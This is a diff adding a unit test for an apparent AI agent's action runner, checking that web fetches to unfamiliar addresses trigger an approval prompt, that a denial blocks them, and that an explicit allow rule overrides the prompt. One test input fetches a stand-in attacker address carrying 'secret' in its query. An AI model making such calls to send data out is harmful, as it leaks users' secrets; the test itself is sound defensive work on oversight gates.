@@ -297,3 +297,18 @@ test('a routine runs only on its exact phrase, with filler words ignored', async
   assert.equal(matchRoutine('please', routines), null);
   for (const r of routines) assert.ok(r.name && r.phrases.length && r.steps.length, r.name);
 });
+
+test('askIf turns an automatic call into a question, but an allow rule still wins', async () => {
+  const asked = [];
+  const make = (rules) => createActionRunner({
+    actions: [{ name: 'web_fetch', description: 'd', tier: 'auto', effect: 'read', primary: 'url', parameters: { type: 'object', properties: { url: { type: 'string' } }, required: ['url'] } }],
+    handlers: { web_fetch: async () => 'page' },
+    getRules: () => rules,
+    approve: async (r) => { asked.push(r.reason); return 'deny'; },
+    askIf: (name, args) => (args.url.includes('known') ? null : 'unknown address'),
+  });
+  assert.equal((await make({}).run({ id: '1', name: 'web_fetch', arguments: '{"url":"https://known.org"}' })).ok, true);
+  assert.equal((await make({}).run({ id: '2', name: 'web_fetch', arguments: '{"url":"https://evil.org/?q=secret"}' })).ok, false);
+  assert.deepEqual(asked, ['unknown address']);
+  assert.equal((await make({ allow: ['web_fetch(https://evil.org*)'] }).run({ id: '3', name: 'web_fetch', arguments: '{"url":"https://evil.org/x"}' })).ok, true);
+});
